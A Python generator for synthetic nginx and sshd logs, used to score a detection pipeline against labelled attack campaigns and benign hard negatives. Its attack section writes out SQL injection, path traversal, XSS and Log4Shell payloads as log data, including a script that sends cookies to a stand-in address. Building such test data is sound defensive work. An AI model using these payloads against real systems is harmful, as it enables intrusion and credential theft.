"""Synthetic log generator with ground-truth labels.

The generator writes an nginx-style access.log and an sshd-style auth.log that mix
ordinary traffic with labelled attack campaigns. It also plants "hard negatives":
harmless behaviour that looks a little like an attack (a crawler hitting dead links,
a search for the words "select shoes", a person who mistypes a password). The labels
file records which rules each campaign should trigger, so the pipeline can be scored.

All attacker addresses come from the reserved documentation ranges (RFC 5737), and
every run with the same seed produces identical files.
"""
from __future__ import annotations

import json
import os
import random
from calendar import timegm
from typing import Dict, List, Tuple
from urllib.parse import quote

MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]
BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
]
GOOGLEBOT = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
SEARCH_TERMS = ["running shoes", "select shoes", "union square hotels", "drop shipping guide", "o'reilly books",
                "fish & chips", "cats and dogs", "blue jacket", "gift card", "winter boots", "coffee grinder"]
BLOG = ["welcome", "spring-sale", "how-to-choose-a-jacket", "care-guide", "our-story", "sql-select-tips"]
VALID_USERS = ["alice", "bob", "carol", "deploy", "root", "ubuntu"]
WORDLIST = ("admin login backup test dev staging old new api v1 v2 uploads files images js css static assets "
            "cgi-bin config conf setup install install.php wp-admin wp-content wp-includes xmlrpc.php readme.html "
            "license.txt sitemap.xml robots.txt crossdomain.xml phpinfo.php info.php test.php shell.php c99.php "
            "admin.php administrator manager console dashboard panel cpanel webmail mail email ftp db database "
            "sql dump logs log tmp temp cache private secret hidden internal intranet portal user users account "
            "accounts profile register signup reset password forgot support help docs documentation download "
            "downloads data export import report reports stats status health metrics debug trace jenkins gitlab "
            "svn cvs core app application apps src source bin lib vendor node_modules package.json composer.json "
            "Dockerfile docker-compose.yml web.config .htaccess .bash_history .DS_Store").split()


def _web_time(epoch: int) -> str:
    t = _gm(epoch)
    return "%02d/%s/%04d:%02d:%02d:%02d +0000" % (t[2], MONTHS[t[1] - 1], t[0], t[3], t[4], t[5])


def _gm(epoch: int):
    import time
    return time.gmtime(epoch)


def _nginx_escape(text: str) -> str:
    """nginx writes double quotes and backslashes inside logged values as \\x22 and \\x5C."""
    return text.replace("\\", "\\x5C").replace('"', "\\x22")


def _syslog_time(epoch: int) -> str:
    t = _gm(epoch)
    return "%s %2d %02d:%02d:%02d" % (MONTHS[t[1] - 1], t[2], t[3], t[4], t[5])


class Builder:
    def __init__(self, seed: int, start: int):
        self.rng = random.Random(seed)
        self.start = start
        self.web: List[Tuple[int, str]] = []
        self.auth: List[Tuple[int, str]] = []

    # -- line writers
    def web_line(self, epoch, ip, method, path, status, ua, user="-", ref="-", size=None):
        size = self.rng.randint(300, 48000) if size is None else size
        path, ua = _nginx_escape(path), _nginx_escape(ua)
        self.web.append((epoch, '%s - %s [%s] "%s %s HTTP/1.1" %d %d "%s" "%s"' % (
            ip, user, _web_time(epoch), method, path, status, size, ref, ua)))

    def ssh(self, epoch, ip, kind, user, valid=True):
        pid = self.rng.randint(1000, 60000)
        port = self.rng.randint(32768, 60999)
        stamp = _syslog_time(epoch)
        if kind == "failed":
            if not valid:
                self.auth.append((epoch, "%s web01 sshd[%d]: Invalid user %s from %s port %d" % (stamp, pid, user, ip, port)))
                self.auth.append((epoch, "%s web01 sshd[%d]: Failed password for invalid user %s from %s port %d ssh2" % (
                    stamp, pid, user, ip, port)))
            else:
                self.auth.append((epoch, "%s web01 sshd[%d]: Failed password for %s from %s port %d ssh2" % (
                    stamp, pid, user, ip, port)))
        else:
            self.auth.append((epoch, "%s web01 sshd[%d]: Accepted password for %s from %s port %d ssh2" % (
                stamp, pid, user, ip, port)))

    def at(self, day: int, hh: int, mm: int, ss: int = 0) -> int:
        return self.start + day * 86400 + hh * 3600 + mm * 60 + ss

    def day_time(self) -> int:
        """Random time in the two-day window, busier in daytime hours."""
        hour = self.rng.choices(range(24), weights=[1, 1, 1, 1, 1, 2, 3, 5, 7, 8, 8, 8, 8, 8, 8, 8, 7, 6, 6, 5, 4, 3, 2, 1])[0]
        return self.start + self.rng.randrange(2) * 86400 + hour * 3600 + self.rng.randrange(3600)


# ---------------------------------------------------------------- benign traffic

def benign_web(b: Builder, labels: dict) -> None:
    rng = b.rng
    clients = ["10.20.%d.%d" % (rng.randint(1, 8), rng.randint(10, 250)) for _ in range(40)]
    ua_of = {ip: rng.choice(BROWSERS) for ip in clients}
    for _ in range(3300):
        ip = rng.choice(clients)
        roll = rng.random()
        if roll < 0.40:
            path = rng.choice(["/", "/products", "/cart", "/checkout", "/about", "/contact"])
        elif roll < 0.55:
            path = "/products/%d" % rng.randint(1, 400)
        elif roll < 0.65:
            path = "/products?id=%d" % rng.randint(1, 400)
        elif roll < 0.75:
            path = "/blog/" + rng.choice(BLOG)
        elif roll < 0.85:
            path = "/search?q=" + quote(rng.choice(SEARCH_TERMS), safe="")
        elif roll < 0.93:
            path = rng.choice(["/static/app.css", "/static/app.js", "/images/%d.jpg" % rng.randint(1, 60)])
        else:
            path = "/download?file=" + rng.choice(["report..2026.pdf", "catalog.pdf", "terms.pdf"])
        status = rng.choices([200, 304, 404, 500], weights=[92, 4, 3, 1])[0]
        if status == 404:
            path = "/old-page-%d" % rng.randint(1, 50)
        b.web_line(b.day_time(), ip, "GET", path, status, ua_of[ip], ref="https://shop.example.test/")
    # ordinary logins, some with one or two typos first
    for _ in range(30):
        ip = rng.choice(clients)
        t = b.day_time()
        for _ in range(rng.choice([0, 0, 1, 2])):
            b.web_line(t, ip, "POST", "/login", 401, ua_of[ip])
            t += rng.randint(6, 20)
        b.web_line(t, ip, "POST", "/login", 302, ua_of[ip])
    # health checks every 30 seconds for a few hours
    for k in range(400):
        b.web_line(b.at(0, 9, 0) + k * 30, "10.20.0.5", "GET", "/healthz", 200, "kube-probe/1.28", size=2)

    # hard negative: password manager misfires, 9 failures in under a minute (threshold is 10)
    t = b.at(1, 14, 5)
    for k in range(9):
        b.web_line(t + k * 5, "10.20.9.1", "POST", "/login", 401, BROWSERS[0])
    b.web_line(t + 50, "10.20.9.1", "POST", "/login", 302, BROWSERS[0])
    # hard negative: Googlebot hits 12 dead links in a minute (threshold is 15 distinct)
    t = b.at(0, 4, 30)
    for k in range(12):
        b.web_line(t + k * 4, "66.249.66.1", "GET", "/legacy/page-%d.html" % k, 404, GOOGLEBOT)
    for k in range(25):
        b.web_line(t + 100 + k * 30, "66.249.66.1", "GET", "/products/%d" % (k + 1), 200, GOOGLEBOT)
    labels["benign_notes"].append({"ip": "10.20.9.1", "note": "password manager misfire: 9 failed logins in 45s, under the threshold of 10"})
    labels["benign_notes"].append({"ip": "66.249.66.1", "note": "search crawler hitting 12 dead links in a minute, under the threshold of 15"})


def benign_ssh(b: Builder, labels: dict) -> None:
    rng = b.rng
    admins = ["10.20.5.%d" % n for n in range(2, 7)]
    for _ in range(45):
        b.ssh(b.day_time(), rng.choice(admins), "accepted", rng.choice(["alice", "bob", "carol", "deploy"]))
    # a couple of ordinary typos then success
    for ip, user in (("10.20.5.3", "alice"), ("10.20.5.4", "bob")):
        t = b.day_time()
        for k in range(3):
            b.ssh(t + k * 7, ip, "failed", user)
        b.ssh(t + 30, ip, "accepted", user)
    # hard negative: six failures spread over an hour never forms a burst
    t = b.at(0, 11, 0)
    for k in range(6):
        b.ssh(t + k * 600, "10.20.5.6", "failed", "carol")
    # known false positive: an engineer who forgets a password, fails six times in 90 seconds, then gets in
    t = b.at(1, 10, 20)
    for k in range(6):
        b.ssh(t + k * 15, "10.20.5.7", "failed", "deploy")
    b.ssh(t + 105, "10.20.5.7", "accepted", "deploy")
    labels["benign_notes"].append({"ip": "10.20.5.6", "note": "six slow typos over an hour, no burst"})
    labels["benign_notes"].append({
        "ip": "10.20.5.7", "note": "engineer forgot a password: 6 failures then success. Looks like AUTH-003 by design; "
                                  "fix is to trust the internal network (see examples/trusted_internal.json)",
        "known_false_positive": ["AUTH-003"]})


# ---------------------------------------------------------------- attacks

def campaign(labels: dict, cid: str, name: str, ips: List[str], expected: List[str], description: str,
             allowed: List[str] = (), known_gap: bool = False) -> None:
    labels["campaigns"].append({"id": cid, "name": name, "ips": ips, "expected_rules": list(expected),
                                "allowed_rules": list(allowed), "known_gap": known_gap, "description": description})


def attacks(b: Builder, labels: dict) -> None:
    rng = b.rng
    # C01 SQL injection by hand
    ip, ua = "203.0.113.10", BROWSERS[3]
    payloads = ["1' OR '1'='1", "1 UNION SELECT username,password FROM users--", "1; DROP TABLE users--",
                "1 AND SLEEP(5)", "' OR 1=1--", "1' UNION ALL SELECT NULL,table_name FROM information_schema.tables--",
                "admin'--", "1 AND 1=1", "1 OR 1=1", "1' AND (SELECT COUNT(*) FROM sqlite_master)>0--",
                "1 UNION SELECT NULL,NULL,NULL--", "1'; WAITFOR DELAY '0:0:5'--"]
    t = b.at(0, 2, 14)
    for i, p in enumerate(payloads):
        enc = quote(p, safe="") if i % 2 else quote(p, safe="'=,()*-")
        b.web_line(t + i * rng.randint(5, 20), ip, "GET", "/products?id=" + enc, rng.choice([200, 500, 500]), ua)
    campaign(labels, "C01", "Manual SQL injection", [ip], ["WEB-001"], "12 hand-typed injection payloads, half URL-encoded.")

    # C02 path traversal
    ip = "203.0.113.11"
    t = b.at(0, 9, 40)
    files = ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//....//etc/passwd",
             "%252e%252e%252f%252e%252e%252fetc%252fpasswd", "..\\..\\..\\windows\\win.ini", "/etc/shadow",
             "php://filter/convert.base64-encode/resource=index.php", "../../../../proc/self/environ"]
    for i, f in enumerate(files):
        b.web_line(t + i * 9, ip, "GET", "/download?file=" + f.replace("\\", "%5c"), rng.choice([400, 403, 404]), BROWSERS[1])
    campaign(labels, "C02", "Path traversal and file inclusion", [ip], ["WEB-002"], "8 attempts to read system files, including double-encoded ones.")

    # C03 XSS probes
    ip = "203.0.113.12"
    t = b.at(0, 15, 5)
    xss = ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>", "javascript:alert(document.cookie)",
           "<svg onload=alert(1)>", "<iframe src=javascript:alert(1)>", "'><script>document.location='http://203.0.113.99/?c='+document.cookie</script>"]
    for i, x in enumerate(xss):
        b.web_line(t + i * 11, ip, "GET", "/search?q=" + quote(x, safe="<>/=\"'()"), 200, BROWSERS[2])
    campaign(labels, "C03", "Cross-site scripting probes", [ip], ["WEB-003"], "6 reflected XSS payloads against the search page.")

    # C04 sqlmap
    ip, ua = "203.0.113.13", "sqlmap/1.7.8#stable (https://sqlmap.org)"
    t = b.at(1, 1, 30)
    tests = ["1 AND 1=1", "1 AND 1=2", "1' AND '1'='1", "1 AND SLEEP(5)", "1 UNION ALL SELECT NULL,NULL", "1) OR 1=1--"]
    for i in range(80):
        b.web_line(t + int(i * 1.1), ip, "GET", "/products?id=" + quote(tests[i % len(tests)], safe="'=,()*-"),
                   rng.choice([200, 200, 500]), ua)
    campaign(labels, "C04", "sqlmap automated scan", [ip], ["WEB-004", "WEB-001"], "80 requests in 90 seconds from sqlmap.")

    # C05 gobuster
    ip, ua = "203.0.113.14", "gobuster/3.6"
    t = b.at(1, 6, 50)
    names = WORDLIST + [".env", ".git/config", "backup.sql", "phpmyadmin/", "wp-config.php"]
    for i, w in enumerate(names):
        b.web_line(t + int(i * 0.3), ip, "GET", "/" + w, 404, ua)
    campaign(labels, "C05", "Gobuster directory brute force", [ip], ["WEB-004", "WEB-005", "WEB-007"],
             "%d missing paths in under a minute, including a few secret file names." % len(names))

    # C06 web login brute force that succeeds
    ip, ua = "198.51.100.20", "python-requests/2.31.0"
    t = b.at(0, 19, 22)
    for i in range(60):
        b.web_line(t + int(i * 1.5), ip, "POST", "/login", 401, ua)
    b.web_line(t + 95, ip, "POST", "/login", 302, ua)
    campaign(labels, "C06", "Login brute force with success", [ip], ["WEB-006"], "60 failed logins in 90 seconds, then a 302.")

    # C07 secret file exposure
    ip, ua = "198.51.100.21", "curl/8.4.0"
    t = b.at(1, 20, 3)
    for i, (path, status) in enumerate([("/.env", 200), ("/.git/config", 200), ("/wp-config.php.bak", 404),
                                        ("/backup.sql", 404), ("/phpmyadmin/", 200), ("/server-status", 403)]):
        b.web_line(t + i * 6, ip, "GET", path, status, ua)
    campaign(labels, "C07", "Exposed secret files", [ip], ["WEB-007"], "6 requests, two of which got real files back.")

    # C13 log4shell
    ip = "203.0.113.15"
    t = b.at(1, 12, 45)
    for i in range(5):
        if i % 2:
            b.web_line(t + i * 3, ip, "GET", "/", 200, "${jndi:ldap://203.0.113.99/a}")
        else:
            b.web_line(t + i * 3, ip, "GET", "/?x=" + quote("${jndi:ldap://203.0.113.99/a}", safe="${}:/"), 200, BROWSERS[0])
    campaign(labels, "C13", "Log4Shell JNDI probes", [ip], ["WEB-008"], "5 lookups in the query string and user agent.")

    # C08 SSH brute force
    ip = "192.0.2.30"
    t = b.at(0, 3, 12)
    for i in range(120):
        user = ["root", "admin", "ubuntu"][i % 3]
        b.ssh(t + int(i * 2), ip, "failed", user, valid=user in VALID_USERS)
    campaign(labels, "C08", "Fast SSH brute force", [ip], ["AUTH-001"], "120 failures in 4 minutes against 3 accounts.")

    # C09 SSH password spraying
    ip = "192.0.2.31"
    t = b.at(1, 4, 0)
    users = ["admin", "test", "oracle", "postgres", "git", "ftp", "user", "guest", "support", "jenkins", "nagios",
             "www", "backup", "mysql", "tomcat", "pi", "vagrant", "ansible", "dev", "demo", "info", "sales", "hadoop", "zabbix"]
    for i, u in enumerate(users):
        b.ssh(t + i * 25, ip, "failed", u, valid=False)
    campaign(labels, "C09", "SSH password spraying", [ip], ["AUTH-002"], "One attempt per account across 24 usernames, slow enough to avoid the burst rule.")

    # C10 compromise
    ip = "192.0.2.32"
    t = b.at(1, 22, 40)
    for i in range(25):
        b.ssh(t + i * 4, ip, "failed", "deploy")
    b.ssh(t + 120, ip, "accepted", "deploy")
    campaign(labels, "C10", "Brute force then successful login", [ip], ["AUTH-001", "AUTH-003"], "25 failures against deploy, then it worked.")

    # C11 low and slow
    ip = "192.0.2.33"
    t = b.at(0, 1, 0)
    for i in range(48):
        b.ssh(t + i * 600, ip, "failed", "root")
    campaign(labels, "C11", "Low-and-slow SSH brute force", [ip], ["AUTH-004"], "One failure every 10 minutes for 8 hours, built to slip under the burst rule.")

    # C12 distributed attack: designed to expose a gap
    ips = ["192.0.2.%d" % n for n in range(100, 140)]
    t = b.at(1, 2, 0)
    for ip in ips:
        start = t + rng.randrange(3600)
        b.ssh(start, ip, "failed", "admin", valid=False)
        b.ssh(start + rng.randint(20, 90), ip, "failed", "admin", valid=False)
    campaign(labels, "C12", "Distributed attack on one account", ips, [],
             "40 addresses, 2 attempts each against admin. No per-IP rule can see it, so this is a known gap.",
             known_gap=True)


def generate(out_dir: str, seed: int = 7, start: str = "2026-10-01") -> Dict:
    year, month, day = (int(x) for x in start.split("-"))
    b = Builder(seed, timegm((year, month, day, 0, 0, 0, 0, 0, 0)))
    labels = {"seed": seed, "start": start, "campaigns": [], "benign_notes": []}
    benign_web(b, labels)
    benign_ssh(b, labels)
    attacks(b, labels)
    os.makedirs(out_dir, exist_ok=True)
    for name, lines in (("access.log", b.web), ("auth.log", b.auth)):
        with open(os.path.join(out_dir, name), "w", encoding="utf-8") as handle:
            for _, text in sorted(lines, key=lambda x: x[0]):
                handle.write(text + "\n")
    labels["year"] = year
    with open(os.path.join(out_dir, "labels.json"), "w", encoding="utf-8") as handle:
        json.dump(labels, handle, indent=2)
    return labels
